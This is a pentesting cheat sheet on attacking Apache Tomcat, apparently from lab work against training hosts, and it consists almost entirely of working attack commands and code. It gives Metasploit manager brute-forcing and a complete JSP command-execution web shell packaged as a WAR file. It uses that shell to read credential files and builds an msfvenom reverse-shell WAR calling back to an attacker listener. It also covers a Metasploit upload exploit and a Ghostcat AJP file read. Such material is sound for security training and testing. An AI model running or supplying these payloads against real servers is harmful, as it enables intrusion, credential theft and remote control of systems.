# Attacking Tomcat

## Brute Force

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

## [WAR](https://en.wikipedia.org/wiki/WAR_(file_format)) File

### RCE

```jsp title="cmd.jsp" linenums="1"
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
%>
</pre>
</BODY></HTML>
```

```sh
my@attack:~$ zip -r application.war cmd.jsp
```

1. Tomcat Web Application Manager
2. Deploy
    * WAR file to deploy
    * Browse: application.war
    * Deploy

```sh
my@attack:~$ curl -s 'http://web01.inlanefreight.local:8180/application/cmd.jsp?cmd=cat+/opt/tomcat/apache-tomcat-10.0.10/conf/tomcat-users.xml' | grep -P 'username=.*password="[^<].*/>$'
```

```xml title="Output"
<user username="tomcat" password="root" roles="manager-gui" />
```

### Reverse Shell

```sh
my@attack:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.37 LPORT=4443 -f war -o reverse_shell_tomcat.war
```

1. Tomcat Web Application Manager
2. Deploy
    * WAR file to deploy
    * Browse: reverse_shell_tomcat.war
    * Deploy

```sh
my@attack:~$ nc -lvnp 4443
my@attack:~$ curl -s 'http://web01.inlanefreight.local:8180/reverse_shell_tomcat/' -L
```

## Metasploit

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername admin
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword admin
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.129.201.58
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set VHOST app-dev.inlanefreight.local
msf6 exploit(multi/http/tomcat_mgr_upload) > run
```

## Ghostcat

### Checking [AJP](https://en.wikipedia.org/wiki/Apache_JServ_Protocol) Port

```sh
my@attack:~$ sudo nmap app-dev.inlanefreight.local -p 8009,8080 -sV
```

```output title="Output" hl_lines="6"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 19:26 +03
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat (language: en)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
```

### [LFI](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

```sh
my@attack:~$ ajpShooter.py "http://app-dev.inlanefreight.local:8080/manager" 8009 /WEB-INF/web.xml read
```
